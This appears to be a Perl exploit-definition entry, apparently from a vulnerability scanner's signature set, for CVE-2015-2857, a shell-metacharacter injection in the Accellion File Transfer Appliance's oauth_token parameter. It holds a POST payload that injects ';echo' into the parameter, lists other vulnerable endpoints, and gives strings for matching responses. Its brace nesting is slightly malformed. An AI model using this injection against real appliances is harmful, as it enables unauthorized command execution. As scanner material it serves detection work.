my $EXPLOIT = {
  CVE => "CVE-2015-2857",
  DESCRIPTION => "

          This module exploits a metacharacter shell injection vulnerability in the Accellion

        File Transfer appliance. This vulnerability is triggered when a user-provided

        'oauth_token' is passed into a system() call within a mod_perl handler. This

        module exploits the '/tws/getStatus' endpoint. Other vulnerable handlers include

        '/seos/find.api', '/seos/put.api', and /seos/mput.api'. This issue was confirmed on

        version FTA_9_11_200, but may apply to previous versions as well. This issue was

        fixed in software update FTA_9_11_210.

      ",
  METHOD => "POST",
  MSF_MODULE => "accellion_fta_getstatus_oauth",
  PAYLOAD => "transaction_id=__TRANSACTION_ID__&oauth_token=invalid&transaction_id=__TRANSACTION_ID__&oauth_token=;echo&transaction_id=__TRANSACTION_ID__&oauth_token=__OAUTH_TOKEN__&",
  REFERENCES => ["http://r-7.co/R7-2015-08"],
  TITLE => "Accellion FTA getStatus verify_oauth_token Command Execution",
  VARIABLES => {
    'TRANSACTION_ID' =>       { DESCRIPTION => "", VALUE => "" },
    'OAUTH_TOKEN' =>       { DESCRIPTION => "", VALUE => "" },
  },
      },  VALIDATION => {
    'TSTRING' =>       (
  "\"result_msg\":\"MD5 token is invalid\"",
  "\"result_msg\":\"Success\",\"transaction_id\":\"",
  "\"result_msg\":\"Success\",\"transaction_id\":\"",
),
